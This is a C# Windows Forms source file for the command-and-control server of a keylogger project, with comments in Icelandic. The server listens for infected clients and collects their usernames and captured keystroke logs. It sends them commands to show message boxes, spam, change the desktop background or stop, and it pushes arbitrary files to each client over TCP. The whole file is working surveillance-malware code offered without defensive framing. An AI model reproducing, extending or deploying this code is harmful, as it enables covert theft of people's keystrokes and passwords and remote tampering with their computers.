using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ForKeyLoggerProject
{

    public partial class Main : Form
    {
        int port;
        int online = 0;
        Thread listenerThread;
        TcpListener listener;
        string file;
        static string usernambes = null;
        public static string ipaddress1;
        public Main()
        {
            InitializeComponent();
        }

        private void btnListen_Click(object sender, EventArgs e) //listen takkinn
        {
            port = int.Parse(txtPort.Text); // portnumerið úr textbox
            btnListen.Enabled = false;
            listener = new TcpListener(IPAddress.Any, port);
            listenerThread = new Thread(Listen);
            listenerThread.Start();
        }
        
        void Listen()//hérna byrjar serverinn að hlusta
        {
            listener.Start(); 
            while (true)
            {
                try {
                    Connection clientConnection = new Connection(listener.AcceptTcpClient());
                    clientConnection.DisconnectedEvent += new Connection.Disconnected(clientConnection_DisconnectedEvent);
                    clientConnection.ReceivedEvent += new Connection.Received(clientConnection_ReceivedEvent);
                }
                catch
                {

                }
                
            }
        }

        void clientConnection_ReceivedEvent(Connection client, String Message)
        {
            string[] cut = Message.Split('|');
            switch (cut[0]) //skilaboð sem serverinn getur tekið á móti
            {
                case "CONNECTED":
                    Invoke(new _AddClient(AddClient), client, null);
                    break;
                case "STATUS":
                    Invoke(new _Status(Status), client, cut[1]);
                    break;
                case "USERNAME":
                    Invoke(new _Username(Username), client, cut[1]);
                    break;
                case "LOGS":
                    Invoke(new _Logs(log), client, cut[1]);
                    break;
            }
        }

        delegate void _Logs(Connection client, String log); //tekur á móti keyloggs textanum og setur í textbox
        void log(Connection client, String log)
        {
            txtBoxKeyLogs.Text = txtBoxKeyLogs.Text + log;
            /*
            foreach (ListViewItem item in listView1.Items)
                if ((Connection)item.Tag == client)
                {
                    item.SubItems[1].Text = log;
                    break;
                }*/
        }
        // Hérna er clientunum sem eru ekki tengd hent út
        void clientConnection_DisconnectedEvent(Connection client)
        {
            Invoke(new _RemoveClient(RemoveClient), client);
        }

        private void btnStop_Click(object sender, EventArgs e) //STOP takking sem sendir skilaboð á client um að restartast
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
            btnListen.Enabled = true;
            listener.Stop();
            listenerThread.Abort();
        }

        #region <Invoking>
        delegate void _AddClient(Connection client, String[] info);
        void AddClient(Connection client, String[] info)  //Ip tölurnar, Status og username sett í Listboxið
        {
            ListViewItem item = new ListViewItem();
            item.Text = client.IPAddress;
            //ipaddress1 = client.IPAddress; 
            item.SubItems.Add("Idle");
            item.SubItems.Add(usernambes);
            if (info != null)
                item = new ListViewItem(info);
            item.Tag = client;
            online++;
            lstBoxUsers.Items.Add(item);
            updateOnline();
        }

        delegate void _RemoveClient(Connection client); //þessi classi hendir út user ef hann disconnectar
        void RemoveClient(Connection client)
        {
            foreach (ListViewItem i in lstBoxUsers.Items)
                if ((Connection)i.Tag == client)
                {
                    i.Remove();
                    online--;
                    updateOnline();
                    break;
                }
        }

        // status á clientinum
        delegate void _Status(Connection client, String Status);
        void Status(Connection client, String Status)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
                if ((Connection)item.Tag == client)
                {
                    item.SubItems[1].Text = Status;
                    break; 
                }

        }

        delegate void _Username(Connection client, String Username); //tekur á máti usernameinu og setur það í public preytu
        void Username(Connection client, String Username)
        {
            usernambes = Username;
        }
        void updateOnline()//hve margir eru online label
        {
            lblOnline.Text = "Online: " + online; 
        }
        #endregion


        private void Main_FormClosing(object sender, FormClosingEventArgs e) //ef forritinu er lokað
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        //
        //Allt hérna fyrir neðan eru takkar sem senda skilbaoð á client  (og einn save data takki)
        //

        private void btnSendMsg_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("MSGBOX|" + txtBoxMsgCaption.Text + "|" + txtBoxMsg.Text.Replace(Environment.NewLine, "[LINE]"));
            }
        }
        private void btnSpam_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("SPAMMERINO|");
            }
        }

        private void btnGetkeylog_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("GETLOGS|");
            }
        }

        private void btnSaveData_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
            {
                saveFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
                saveFileDialog1.FilterIndex = 2;
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    StreamWriter writer = new StreamWriter(saveFileDialog1.FileName);
                    writer.Write(txtBoxKeyLogs.Text);
                    writer.Close();
                }
            }
        }

        private void btnChangeBG_Click(object sender, EventArgs e)
        {
            
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                lstBoxUsers.Items[0].SubItems[1].Text = "BG Change: Sent";
                lstBoxUsers.Update();
                client.Send("BGROUNDCHANGE|");
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog1 = new OpenFileDialog())
            {
                int size = -1;
                DialogResult result = openFileDialog1.ShowDialog(); // Show the dialog.
                if (result == DialogResult.OK) // Test result.
                {
                    file = openFileDialog1.FileName;
                    try
                    {
                        string text = File.ReadAllText(file);
                        size = text.Length;
                    }
                    catch (IOException)
                    {
                    }
                }
            }
            button2.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                lstBoxUsers.Items[0].SubItems[1].Text = "Data: Sent";
                lstBoxUsers.Update();
                ipaddress1 = client.IPAddress;
                client.Send("FILE|");
                SendFile(file);
            }
            btnChangeBG.Enabled = true; 
        }
        public static void SendFile(string fName)
        {
            try
            {
                IPAddress ip = IPAddress.Parse(ipaddress1);
                IPEndPoint end = new IPEndPoint(ip, 2014);
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);

                string path = "";
                fName = fName.Replace("\\", "/");
                while (fName.IndexOf("/") > -1)
                {
                    path += fName.Substring(0, fName.IndexOf("/") + 1);
                    fName = fName.Substring(fName.IndexOf("/") + 1);
                }
                byte[] fNameByte = Encoding.ASCII.GetBytes(fName);
                if (fNameByte.Length > 1000)
                {
                    return;
                }
                byte[] fileData = File.ReadAllBytes(path + fName);
                byte[] clientData = new byte[4 + fNameByte.Length + fileData.Length];
                byte[] fNameLen = BitConverter.GetBytes(fNameByte.Length);
                fNameLen.CopyTo(clientData, 0);
                fNameByte.CopyTo(clientData, 4);
                fileData.CopyTo(clientData, 4 + fNameByte.Length);
                sock.Connect(end);
                Thread.Sleep(1000);
                sock.Send(clientData);
                Thread.Sleep(100);
                sock.Close();
            }
            catch (Exception ex)
            {

            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in lstBoxUsers.Items)
            {
                Connection client = (Connection)item.Tag;
                client.Send("STOP|");
            }
        }
    }
}
